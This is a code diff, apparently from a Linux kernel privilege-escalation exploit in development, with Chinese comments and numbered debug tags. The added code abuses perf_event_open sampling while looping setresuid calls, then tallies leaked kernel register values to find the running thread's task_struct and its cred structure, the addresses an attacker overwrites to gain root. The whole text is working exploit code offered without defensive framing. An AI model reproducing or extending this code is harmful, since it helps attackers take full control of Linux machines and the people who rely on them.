@@ -672,6 +672,7 @@ void slide_reset_trigger_state(void) {
  * perf_event_open 采样本进程 syscall 时各寄存器里的内核地址,
  * 出现最多的候选 = 当前线程的 task_struct (slab 直映射地址). */
 #include <linux/perf_event.h>
+uintptr_t g_perf_cred_cand = 0;  /* mt39: cred candidate from perf, filled when PSELECT_PERF_CRED */
 uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
   memset(&pe, 0, sizeof(pe));
@@ -700,7 +701,7 @@ uintptr_t perf_find_task(void) {
     return 0;
   }
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-  for (volatile int i = 0; i < 500000; i++) syscall(SYS_getpid);
+for (volatile int i = 0; i < 500000; i++) syscall(SYS_setresuid, 0, 0, 0);  /* mt38 setresuid -> cred in x19 */
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
   struct perf_event_mmap_page *hdr = buf;
   uint64_t head = hdr->data_head;
@@ -748,6 +749,41 @@ uintptr_t perf_find_task(void) {
     }
   }
   pr_info("mt28c: perf task=0x%016zx (%d/%d votes)\n", (size_t)best, best_cnt, nc);
+  /* mt37: obs mode - dump cands, look for cred (diff ~0x778/0x780) */
+  if (getenv("PSELECT_PERF_OBS")) {
+    pr_info("mt37: obs cands nc=%d task=%016zx\n", nc, (size_t)best);
+    for (int i2 = 0; i2 < nc && i2 < 40; i2++) {
+      uintptr_t c = cands[i2];
+      pr_info("mt37:   cand[%d]=%016zx diff=%+zd\n", i2, (size_t)c,
+              (ssize_t)c - (ssize_t)best);
+    }
+    fflush(stdout);
+  }
+  /* mt39: try to find cred candidate - non-task addr appearing multiple times */
+  if (getenv("PSELECT_PERF_CRED")) {
+    uintptr_t cred_cand = 0;
+    int cred_cnt = 0;
+    for (int i = 0; i < nc; i++) {
+      uintptr_t c = cands[i];
+      if (c == best) continue;
+      int cnt = 0;
+      for (int j = 0; j < nc; j++)
+        if (cands[j] == c) cnt++;
+      if (cnt > cred_cnt) {
+        cred_cnt = cnt;
+        cred_cand = c;
+      }
+    }
+    if (cred_cand) {
+      pr_info("mt39: cred_cand=%016zx votes=%d (task=%016zx diff=%+zd\n",
+              (size_t)cred_cand, cred_cnt, (size_t)best,
+              (ssize_t)cred_cand - (ssize_t)best);
+      fflush(stdout);
+      g_perf_cred_cand = cred_cand;  /* store for main.c, keep returning task */
+    } else {
+      pr_warning("mt39: no cred candidate found\n");
+  }
+}
   return best;
 }
 
